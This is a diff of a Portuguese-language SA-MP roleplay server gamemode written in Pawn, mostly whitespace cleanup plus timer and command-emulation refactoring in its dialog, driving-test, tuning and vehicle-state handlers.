 					ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
 		        }
 		    }
-		    
+
 		    return 1;
 		}
 		case DIALOG_PSP_QUEIXA:
 		{
 		    if(!response) return 1;
 		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FF0000}Queixa inválida. {FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
-		    
+
 		    format(string, sizeof(string), "[ESQUADRA:] {FFFFFF}O cidadão %s apresentou a queixa: %s", GetPlayerNameEx(playerid), inputtext);
    			foreach(new i : Player)
 			{
-				// if(!IsPlayerConnected(i)) continue;
 				if(pInfo[i][Faction] == 0) continue;
 				if(fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
 				if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) continue;
@@ -4711,7 +4696,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			}
 			format(string, sizeof(string), "[ESQUADRA:] {FFFFFF}Enviaste a queixa: %s", inputtext);
 			SendClientMessage(playerid, 0x4F7EFFAA, string);
-			
+
 			return 1;
 		}
 		case DIALOG_CM:
@@ -4724,9 +4709,9 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        {
 					if(pInfo[playerid][CC] != -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Cartão de Cidadão!");
 					if(GetPlayerMoneyEx(playerid) < 500) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-					
+
 					GivePlayerMoneyEx(playerid, -500);
-					
+
 					pInfo[playerid][CC] = pInfo[playerid][UID];
 					SendClientMessage(playerid, COLOR_INFO, "Compraste o teu Cartão de Cidadão com sucesso!");
 		        }
@@ -4735,22 +4720,22 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					//ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
 		        }
 		    }
-		    
+
 		    return 1;
 		}
 		case DIALOG_LICENCAS:
 		{
 		    if(!response) return 1;
-		    
+
 		    switch(listitem)
 		    {
 				case 0: // código
 				{
 				    if(GetPlayerMoneyEx(playerid) < PRECO_CODIGO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 				    if(pInfo[playerid][Codigo] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens o Código da Estrada");
-				    
+
 				    GivePlayerMoneyEx(playerid, -PRECO_CODIGO);
-				    
+
 					format(string, sizeof(string), "{FFFFFF}Bem Vindo é tua aula do {00FF00}Código da Estrada{FFFFFF}. {FF0000}Lê atentamente{FFFFFF}, pois vais ter de passar um teste."); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FFFFFF}Uma das principais regras de trânsito é nunca ultrapassar mais de 2 carros seguidos."); strcat(sdialog,string);
 					format(string, sizeof(string), "\n{FFFFFF}Para efectuar qualquer ultrapassagem utilize os piscas."); strcat(sdialog,string);
@@ -4765,14 +4750,15 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				    if(GetPlayerMoneyEx(playerid) < PRECO_LIGEIROS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 				    if(pInfo[playerid][CartaLig] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Ligeiros");
 					if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
-				    
+
 				    GivePlayerMoneyEx(playerid, -PRECO_LIGEIROS);
-				    
+
 				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com o carro. Boa sorte!");
-				    
+
 				    ATirarCartaLigeiro[playerid] = true;
 				    RotaConducao[playerid] = 2;
-				    
+				    TimerVelocidadeCarta[playerid] = SetPlayerTimer(playerid, "VelocidadeCarta", 500, true);
+
 				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
 				}
 				case 2: // pesados
@@ -4780,14 +4766,15 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				    if(GetPlayerMoneyEx(playerid) < PRECO_PESADOS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 				    if(pInfo[playerid][CartaPesados] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Pesados");
 					if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
-				    
+
 				    GivePlayerMoneyEx(playerid, -PRECO_PESADOS);
 
 				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com o camião. Boa sorte!");
 
 				    ATirarCartaPesados[playerid] = true;
 				    RotaConducao[playerid] = 2;
-				    
+				    TimerVelocidadeCarta[playerid] = SetPlayerTimer(playerid, "VelocidadeCarta", 500, true);
+
 				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
 				}
 				case 3: // motas
@@ -4795,14 +4782,15 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				    if(GetPlayerMoneyEx(playerid) < PRECO_MOTAS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 				    if(pInfo[playerid][CartaMota] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Motociclos");
     				if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
-				    
+
 				    GivePlayerMoneyEx(playerid, -PRECO_MOTAS);
 
 				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com a mota. Boa sorte!");
 
 				    ATirarCartaMota[playerid] = true;
 				    RotaConducao[playerid] = 2;
-				    
+				    TimerVelocidadeCarta[playerid] = SetPlayerTimer(playerid, "VelocidadeCarta", 500, true);
+
 				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
 				}
 				case 4:
@@ -4817,17 +4805,18 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				    ATirarCartaBarco[playerid] = true;
 				    RotaConducao[playerid] = 2;
+				    TimerVelocidadeCarta[playerid] = SetPlayerTimer(playerid, "VelocidadeCarta", 500, true);
 
 				    SetPlayerCheckpoint(playerid, 113.569793, -1808.766845, -0.266756, 5.0);
 				}
 			}
-			
+
 			return 1;
 		}
 		case DIALOG_CODIGO:
 		{
 		    if(!response) return 1;
-		    
+
 			format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quantos carros posso ultrapassar de seguida no máximo?"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FF9900}2"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{FF9900}1"); strcat(sdialog,string);
@@ -4848,7 +4837,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_CODIGO1, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
 		    }
-		    
+
 		    switch(listitem)
 		    {
 		        case 0:
@@ -4897,7 +4886,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_CODIGO2, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
 		    }
-		    
+
 		    switch(listitem)
 		    {
 		        case 0:
@@ -4946,7 +4935,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 				return ShowPlayerDialog(playerid, DIALOG_CODIGO3, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
 		    }
-		    
+
 		    switch(listitem)
 			{
 			    case 0:
@@ -4974,17 +4963,17 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				case 4: // certa
 				{
 				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Parabéns, passaste no Código da Estrada!");
-				    
+
 				    pInfo[playerid][Codigo] = 1;
 				}
 			}
 			return 1;
 		}
 	}
-	
+
 	// --------------------------------------- SISTEMA DE TUNNING BY KLAP ---------------------------------------
 
-	new car = GetPlayerVehicleID(playerid);
+ 	new car = GetPlayerVehicleID(playerid);
 
 	if(dialogid == DIALOG_TUNNING)
 	{
@@ -5102,7 +5091,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
                     GivePlayerMoneyEx(playerid, -35000);
 
                     cInfo[car][mod1] = 1;
-                    
+
 					ChangeVehiclePaintjob(car,1);
 					PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
 					SendClientMessage(playerid,COLOR_WHITE,"PaintJob número 2 adicionado ao veículo.");
@@ -5130,7 +5119,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				GetVehicleModel(car) == 558)
 			    {
    				   GivePlayerMoneyEx(playerid, -35000);
-   				   
+
    				   cInfo[car][mod1] = 2;
 
                    ChangeVehiclePaintjob(car,2);
@@ -5289,7 +5278,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					else if(GetVehicleModel(car) == 561)
 					{
 					    GivePlayerMoneyEx(playerid, -10000);
-	
+
 					    AddVehicleComponentEx(car,1064);
 					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
 					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
@@ -6904,9 +6893,9 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        		return 1;
      			}
      			GivePlayerMoneyEx(playerid, -15000);
-     			
+
      			ShowPlayerDialog(playerid, DIALOG_TUNNING+14, DIALOG_STYLE_LIST, "Tunning Menu", "Verde\nAmarelo\nBranco\nRosa\nVermelho\nAzul", "Selecionar", "Sair");
-     			
+
 			}
 			if(listitem == 4)//BACK
             {
@@ -6917,7 +6906,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	if(dialogid == DIALOG_TUNNING+14)
 	{
 	    if(!response) return 1;
-	    
+
 		switch(listitem)
 		{
 			case 0:
@@ -7016,7 +7005,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		}
 		return 1;
  	}
-	
+
     return 0;
 }
 
@@ -7026,7 +7015,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
     {
         new car = GetPlayerVehicleID(playerid);
         new gasolina[8];
-        
+
         TextDrawShowForPlayer(playerid, TDEditor_TDVel[0]);
         TextDrawShowForPlayer(playerid, TDEditor_TDVel[1]);
         TextDrawShowForPlayer(playerid, TDEditor_TDVel[2]);
@@ -7043,7 +7032,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
         PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][0]);
         PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][1]);
         PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][2]);
-        
+
         if(cInfo[car][Travao] == 1)
         {
             PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], COLOR_ERRO);
@@ -7052,24 +7041,24 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
         {
             PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], -1);
         }
-        
+
         PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]); // (!)
         PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][4]);
 
         format(gasolina, sizeof(gasolina), "%d", cInfo[car][Gasolina]);
         PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][1], gasolina);
-        
+
         format(gasolina, sizeof(gasolina), "%d", cInfo[car][Kilometros]);
         PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][2], gasolina);
-        
-        TimerVelocimetro[playerid] = SetTimerEx("Velocimetro", 300, true, "i", playerid);
-        
+
+        TimerVelocimetro[playerid] = SetPlayerTimer(playerid, "Velocimetro", 300, true);
+
         CounterVelocimetro[playerid] = 0;
         CounterKilometros[playerid] = 0;
-        
+
         PlayerActionMessage(playerid, 15.0, "entra no veículo.");
     }
-    
+
     if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT)
     {
 	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[0]);
@@ -7092,37 +7081,37 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][4]);
 
 	    KillTimer(TimerVelocimetro[playerid]);
-	    
+
 	    StopAudioStreamForPlayer(playerid);
-	    
+
 	    if(Cinto[playerid] == true)
 	    {
 	        PlayerActionMessage(playerid, 15.0, "clica no botão e tira o cinto de segurança.");
 	    }
-	    
+
 	    Cinto[playerid] = false;
 		CounterKilometros[playerid] = 0;
 		CounterVelocimetro[playerid] = 0;
 
 	    PlayerActionMessage(playerid, 15.0, "sai do veículo.");
     }
-    
+
     return 1;
 }
 
 public OnVehicleDeath(vehicleid, killerid)
 {
 	cInfo[vehicleid][Vida] = 300.0;
-    
+
     return 1;
 }
 
 public OnVehicleSpawn(vehicleid)
 {
 	SetVehicleHealth(vehicleid, cInfo[vehicleid][Vida]);
-    
+
     AtualizarTunning(vehicleid);
-    
+
     return 1;
 }
 
@@ -7149,14 +7138,14 @@ public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
 	    {
 			RemoverJogadorDoCarro(playerid);
 			GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
-			
+
 			return 1;
 	    }
 	    if(cInfo[car][Type] == 0)
 	    {
 			RemoverJogadorDoCarro(playerid);
 			SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro não está configurado. Contacta um administrador.");
-			
+
 			return 1;
 	    }
 		else if(cInfo[car][Type] != 0 && cInfo[car][Type] != -1 && cInfo[car][Type] != -2 && cInfo[car][Type] != 50 && cInfo[car][Type] != 51 && cInfo[car][Type] != 52 && cInfo[car][Type] != 53)
@@ -7289,17 +7278,17 @@ public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
 public OnPlayerText(playerid, text[])
 {
     Tickbefore_Text[playerid] = GetTickCount();
-    
+
     new string[256];
-    
-    ChatLog(playerid, text);
-    
+
+    ChatLog(playerid, text, false);
+
 	if(Logged[playerid] == false)
 	{
     	SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás logado!");
         return 0;
-	} 
-	
+	}
+
 	if(AdminDuty[playerid] == false)
 	{
 		format(string, sizeof(string), "%s", text);
@@ -7310,14 +7299,13 @@ public OnPlayerText(playerid, text[])
 		format(string, sizeof(string), "%s", text);
 		ProxDetectorChatDuty(25.0, playerid, string);
 	}
-	
+
 	if(ASerEntrevistado[playerid] == true)
 	{
 	    format(string, sizeof(string), "[PC-NEWS:] %s diz: %s", GetPlayerNameEx(playerid), text);
 
     	foreach(new i : Player)
     	{
-        	// if(!IsPlayerConnected(i)) continue;
 			if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
 			if(IsPlayerInAnyVehicle(i))
 			{
@@ -7333,21 +7321,20 @@ public OnPlayerText(playerid, text[])
 
 		foreach(new i : Player)
     	{
-        	// if(!IsPlayerConnected(i)) continue;
         	if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
 			if(IsPlayerInAnyVehicle(i))
 			{
 			    new car = GetPlayerVehicleID(i);
 				if(cInfo[car][RadioStatus] == 0) continue;
 			}
-			
+
 			SendClientMessage(i, COLOR_NEWS, string);
     	}
 	}
 	if(AFalarTele[playerid] == true)
 	{
 		new name[24];
-		
+
 		if(IsAmigo(AFalarPara[playerid], playerid) == 1)
 		{
 			format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
@@ -7356,16 +7343,16 @@ public OnPlayerText(playerid, text[])
 		{
 			format(name, sizeof(name), "%d", pInfo[playerid][NumeroTelemovel]);
 		}
-		
+
 	    format(string, sizeof(string), "{FFFF00}[TELEMÓVEL:] Disseste: {FFFFFF}%s", GetPlayerNameEx(playerid), text);
 	    SendClientMessage(playerid, COLOR_INFO, string);
-	    
+
 	    format(string, sizeof(string), "{FFFF00}[TELEMÓVEL:] %s disse: {FFFFFF}%s", name, text);
 	    SendClientMessage(AFalarPara[playerid], COLOR_INFO, string);
 	}
-	
+
 	Tickafter_Text[playerid] = GetTickCount();
-	
+
 	if(Tickbefore_Text[playerid] <= Tickafter_Text[playerid] && Tickafter_Text[playerid]-Tickbefore_Text[playerid] < 5000)
 	{
 		TickTotal_Text += Tickafter_Text[playerid]-Tickbefore_Text[playerid];
@@ -7379,20 +7366,20 @@ public OnPlayerText(playerid, text[])
 			SendClientMessage(playerid, COLOR_RED, stringcmd);
 		}
 	}
-	
-    return 0; 
+
+    return 0;
 }
 
 public LigarMotor(playerid)
 {
     new car = GetPlayerVehicleID(playerid);
     new engine, lights, alarm, doors, bonnet, boot, objective;
-    
+
  	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
 	SetVehicleParamsEx(car, 1,lights,alarm,doors,bonnet,boot,objective);
-	
+
 	Motor[car] = true;
-	
+
 	if(cInfo[car][IsCaravana] == 1 || cInfo[car][IsCaravana] == 2)
 	{
 	 	DestroyDynamicPickup(HousePickup[cInfo[car][CaravanaCasaID]]);
@@ -7405,28 +7392,29 @@ public LigarMotor(playerid)
 		hInfo[cInfo[car][CaravanaCasaID]][EnterInterior] = 0;
 		hInfo[cInfo[car][CaravanaCasaID]][EnterVirtualWorld] = 0;
 	}
-	
+
+	return 1;
+}
+
+public AnimMorteAtualizar(playerid)
+{
+    ClearAnimations(playerid);
+    ApplyAnimation(playerid, "PARACHUTE", "FALL_skyDive_DIE", 4.0, 0, 1, 1, 1, -1);
+
 	return 1;
 }
 
 public Morte(playerid)
 {
-    SetPlayerHealthEx(playerid, 1000, 0);
+    SetPlayerHealthEx(playerid, 1000, HEALTH_SET);
     SetPlayerArmourEx(playerid, 0, 0);
-	//GivePlayerMoneyEx(playerid, 100);
 
-	SetPlayerPosEx(playerid, pInfo[playerid][MorteX], pInfo[playerid][MorteY], pInfo[playerid][MorteZ]);
-	
-	SetPlayerInterior(playerid, pInfo[playerid][MorteInterior]);
-	SetPlayerVirtualWorld(playerid, pInfo[playerid][MorteVirtualWorld]);
-	
+	SetPlayerPosEx(playerid, pInfo[playerid][MorteX], pInfo[playerid][MorteY], pInfo[playerid][MorteZ], pInfo[playerid][MorteVirtualWorld], pInfo[playerid][MorteInterior]);
+
     GameTextForPlayer(playerid,"~r~ Gravemente Ferido", 15000, 5);
     PlayerActionMessage(playerid, 15.0, "cai para o chão desmaiado.");
-    
-    ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,2000,1);
-    ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,2000,1);
-    
-	TogglePlayerControllable(playerid, 0);
+
+    SetPlayerTimer(playerid, "AnimMorteAtualizar", 500, false);
 
 	return 1;
 }
@@ -7434,29 +7422,29 @@ public Morte(playerid)
 public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 {
 	Tickbefore_Key[playerid] = GetTickCount();
-	
+
 	if(newkeys == 8)
 	{
 	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
 	    {
-		    cmd_entrar(playerid, "", 0);
-		    cmd_sair(playerid, "", 0);
+	        PC_EmulateCommand(playerid, "/entrar");
+	        PC_EmulateCommand(playerid, "/sair");
 	    }
 	    else if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
 	    {
-	        cmd_entrar(playerid, "", 0);
+	        PC_EmulateCommand(playerid, "/entrar");
 	    }
 	}
 	if(newkeys == KEY_HANDBRAKE)
 	{
 	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
 	    {
-	        cmd_portapsp(playerid, "", 0);
+	        PC_EmulateCommand(playerid, "/portapsp");
 		}
-		cmd_garagempsp(playerid, "", 0);
-		cmd_garagemsr(playerid, "", 0);
+		PC_EmulateCommand(playerid, "/garagempsp");
+		PC_EmulateCommand(playerid, "/garagemsr");
 	}
-	
+
 	if(newkeys == KEY_NO) // N
 	{
 	    if(IsPlayerInRangeOfPoint(playerid, 1.0, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ]))
@@ -7505,16 +7493,16 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 			format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Extrair"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Extrato"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Transferir"); strcat(sdialog,string);
-			format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Carregar Telemóvel"); strcat(sdialog,string); 
+			format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Carregar Telemóvel"); strcat(sdialog,string);
 			format(string, sizeof(string), "\n{00FF00}[6] {FFFFFF}Comprar Licença de Pesca"); strcat(sdialog,string);
-			
+
 			if(pInfo[playerid][Faction] != 0 && pInfo[playerid][FactionRank] == 1)
 			{
 				format(string, sizeof(string), "\n{00FF00}[7] {FFFFFF}Faction Extrato"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{00FF00}[8] {FFFFFF}Faction Extrair"); strcat(sdialog,string);
 				format(string, sizeof(string), "\n{00FF00}[9] {FFFFFF}Faction Depositar"); strcat(sdialog,string);
 			}
-			
+
 			ShowPlayerDialog(playerid, DIALOG_BANCO_MENU, DIALOG_STYLE_LIST, "{FFFF00}BANCO", sdialog, "Selecionar", "Sair");
 		}
 		else if(IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ]))
@@ -7538,7 +7526,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 		else if(GetPlayerVirtualWorld(playerid) != 0) // está em casa, building ou biz
 		{
 			new vw = GetPlayerVirtualWorld(playerid);
-			
+
 			if(IsPlayerInRangeOfPoint(playerid, 4, bInfo[vw][ActorX], bInfo[vw][ActorY], bInfo[vw][ActorZ])) // tá perto do actor
 			{
 			    new sdialog[512];
@@ -7570,7 +7558,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 
 						ShowPlayerDialog(playerid, DIALOG_LOJA_BAR, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}BAR", sdialog, "Selecionar", "Sair");
 				    }
-				    case BTYPE_247: 
+				    case BTYPE_247:
 				    {
 						format(sdialog, sizeof(sdialog),
 						"Serviço\tPreço\n\
@@ -7590,20 +7578,20 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 				    case BTYPE_STAND:
 				    {
 				        new string[128];
-				        
+
 						format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Catálogo"); strcat(sdialog,string);
 						format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Comprar veículo"); strcat(sdialog,string);
 
 						ShowPlayerDialog(playerid, DIALOG_LOJA_STAND, DIALOG_STYLE_LIST, "{FFFF00}STAND", sdialog, "Selecionar", "Sair");
 				    }
-				    case BTYPE_CACA: 
+				    case BTYPE_CACA:
 				    {
 			            Menu_Show(playerid, MenuArmas, 0x9FE5F5FF, false);
 			            TogglePlayerControllable(playerid, false);
 
 			 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as armas.");
 				    }
-				    case BTYPE_ROUPA: 
+				    case BTYPE_ROUPA:
 				    {
 						format(sdialog, sizeof(sdialog),
 						"Serviço\tPreço\n\
@@ -7615,7 +7603,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 				    case BTYPE_FARMACIA:
 				    {
 				        new string[128];
-				        
+
 						format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Cêgripe [$100]"); strcat(sdialog,string);
 						format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Cran-Aid [$100]"); strcat(sdialog,string);
 						format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Tylenol [$100]"); strcat(sdialog,string);
@@ -7623,7 +7611,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 
 						ShowPlayerDialog(playerid, DIALOG_FARMACIA, DIALOG_STYLE_LIST, "{FFFF00}MENU DA LOJA", sdialog, "Selecionar", "Sair");
 				    }
-				    case BTYPE_SEGURADORA: 
+				    case BTYPE_SEGURADORA:
 				    {
 						format(sdialog, sizeof(sdialog),
 						"Serviço\tPreço\tMensalidade\n\
@@ -7636,19 +7624,19 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 			}
 		}
 	}
-	
+
 	if(IsPlayerInAnyVehicle(playerid))
 	{
 		if(newkeys == 1 && PLAYER_STATE_DRIVER)
 		{
-      		cmd_motor(playerid, "", 0);
+      		PC_EmulateCommand(playerid, "/motor");
 		}
 		if(newkeys == 4 && PLAYER_STATE_DRIVER)
 		{
-	    	cmd_luzes(playerid, "", 0);
+		    PC_EmulateCommand(playerid, "/luzes");
 		}
 	}
-	
+
 	Tickafter_Key[playerid] = GetTickCount();
 
 	if(Tickbefore_Key[playerid] <= Tickafter_Key[playerid] && Tickafter_Key[playerid]-Tickbefore_Key[playerid] < 5000)
@@ -7664,7 +7652,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 			SendClientMessage(playerid, COLOR_RED, stringcmd);
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -7677,14 +7665,14 @@ public OnPlayerEnterCheckpoint(playerid)
 	{
 	    DisablePlayerCheckpoint(playerid);
 	    FirstSpawn[playerid] = false;
-	    
+
 	    return 1;
 	}
 
 	if(ATirarCartaLigeiro[playerid] == true || ATirarCartaPesados[playerid] == true || ATirarCartaMota[playerid] == true) // if(GetPlayerSpeed(playerid) > 90) { SpeedWarning[playerid]++; }
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		switch(RotaConducao[playerid])
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 1413.712646, -1729.940673, 13.117656, 5.0); RotaConducao[playerid]=3; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
@@ -7717,18 +7705,20 @@ public OnPlayerEnterCheckpoint(playerid)
 			{
 			    SetVehicleToRespawn(car);
 			    AtualizarDanosCarro(car);
-			    
+
 				RotaConducao[playerid] = 0;
 				DisablePlayerCheckpoint(playerid);
 
+                KillTimer(TimerVelocidadeCarta[playerid]);
+
 				new Float:cVida;
 				GetVehicleHealth(car, cVida);
-				
+
 				if(cVida < 980.0) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O carro está danificado! Não passaste no exame de condução.");
 				if(SpeedWarning[playerid] > 1) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Passaste o limite de velocidade! Não passaste no exame de condução.");
-				
+
                 SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O carro não está danificado nem passaste o limite. Passaste no exame de condução.");
-                
+
                 if(ATirarCartaLigeiro[playerid] == true)
                 {
                     ATirarCartaLigeiro[playerid] = false;
@@ -7750,7 +7740,7 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(ATirarCartaBarco[playerid] == true) // if(GetPlayerSpeed(playerid) > 90) { SpeedWarning[playerid]++; }
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		switch(RotaConducao[playerid])
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 113.556144, -1937.620727, -0.093732, 5.0); RotaConducao[playerid]=3; }
@@ -7791,9 +7781,9 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 1 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		format(string, sizeof(string), "Rotajob1: %d", RotaJob1[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob1[playerid]) // AUTOCARROS
 		{
 			case 2: { SetPlayerCheckpoint(playerid, 2301.632568, -2262.099853, 13.102064, 5.0); RotaJob1[playerid]=3; }
@@ -7854,7 +7844,7 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 2)
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob2: %d", RotaJob2[playerid]); SendClientMessage(playerid, -1, string);
 
 		new hID = random(80);
@@ -7881,9 +7871,9 @@ public OnPlayerEnterCheckpoint(playerid)
 	else if(pInfo[playerid][Emprego] == 3 && cInfo[car][Type] == pInfo[playerid][Emprego])
 	{
 		DisablePlayerCheckpoint(playerid);
-		
+
 		// format(string, sizeof(string), "Rotajob3: %d", RotaJob3[playerid]); SendClientMessage(playerid, -1, string);
-		
+
 		switch(RotaJob3[playerid]) // LIXEIROS
 		{
